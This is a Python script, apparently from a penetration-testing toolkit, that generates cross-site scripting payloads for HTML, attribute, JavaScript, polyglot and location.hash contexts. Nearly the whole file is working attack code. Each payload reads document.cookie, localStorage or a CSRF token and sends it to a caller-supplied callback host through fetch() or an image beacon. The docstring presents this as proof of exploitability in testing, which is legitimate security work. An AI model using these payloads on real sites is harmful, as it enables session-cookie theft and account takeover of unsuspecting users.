#!/usr/bin/env python
"""xss_payloads.py — OOB-exfil XSS payload generator (stdlib; wired to oob.py).

The kit drives an ATTACKER browser but never proves XSS in a VICTIM context. This generates XSS
payloads that exfiltrate document.cookie / localStorage / a CSRF token to an OOB callback (from
tools/checks/oob.py), across contexts (raw HTML, attribute, inside JS, inside <script>, a DOM/location.hash sink, + a
polyglot). Inject the payload, RENDER it in a browser (web-tester/exploiter), then poll oob.py for
the callback — a callback carrying a cookie = end-to-end confirmed XSS (CWE-79), not just reflection.

Usage: python xss_payloads.py --callback <http://host:port/marker> [--exfil cookie|storage|token]
"""
import sys, json, argparse

def payloads(callback, exfil="cookie"):
    # the JS that exfils to the callback (cookie / storage / location)
    if exfil == "storage":
        grab = "JSON.stringify(localStorage)"  # storage
    elif exfil == "token":
        grab = "(e=>e?(e.content||e.value||''):'')(document.querySelector('[name=csrf-token],[name=csrfmiddlewaretoken],meta[name=csrf-token]'))"
    else:
        grab = "document.cookie"
    cb = callback.rstrip("/")
    # the fetch-beacon primitive (works from img-onerror, svg-onload, script, etc.)
    beacon = f"fetch('{cb}/X?'+encodeURIComponent({grab}+location.href))"
    img_beacon = f"new Image().src='{cb}/X?'+encodeURIComponent({grab})"  # img-onerror-friendly (no fetch needed)
    return {
        "html_img_onerror": f"<img src=x onerror=\"{img_beacon}\">",
        "html_svg_onload": f"<svg onload=\"{beacon}\">",
        "html_body_onload": f"<body onload=\"{beacon}\">",
        "html_details_ontoggle": f"<details open ontoggle=\"{beacon}\">x</details>",
        "attr_breakout": f"\"><img src=x onerror=\"{img_beacon}\">",
        "attr_onfocus_autofocus": f"\" onfocus=\"{beacon}\" autofocus=\"",
        "js_breakout_semicolon": f"';{beacon}//",
        "js_breakout_script_close": f"</script><img src=x onerror=\"{img_beacon}\">",
        "script_src": f"<script src=\"{cb}/xss.js\"></script>",  # host xss.js that does the beacon
        "polyglot": (f"jaVasCript:/*-/*`/*`/*'/*\"/**/(/* */oNcliCk=({beacon}) )//"
                     f"<!--><img src=x onerror=\"{img_beacon}\">-->"),
        "dom_location_hash": f"#<img src=x onerror=\"{img_beacon}\">",  # for location.hash sinks
    }

if __name__ == "__main__":
    ap = argparse.ArgumentParser(description="OOB-exfil XSS payload generator")
    ap.add_argument("--callback", required=True, help="the OOB callback URL (from oob.py Collab.callback)")
    ap.add_argument("--exfil", default="cookie", choices=["cookie", "storage", "token"])
    a = ap.parse_args()
    p = payloads(a.callback, a.exfil)
    print(json.dumps({"callback": a.callback, "exfil": a.exfil, "payloads": p,
                      "note": "Inject -> RENDER in a browser (web-tester/exploiter) -> poll oob.py for the callback. A callback carrying the exfil'd value = END-TO-END confirmed XSS (CWE-79), not just reflection. Pick the context-appropriate payload; the polyglot works across HTML/attr/JS."}, indent=2))
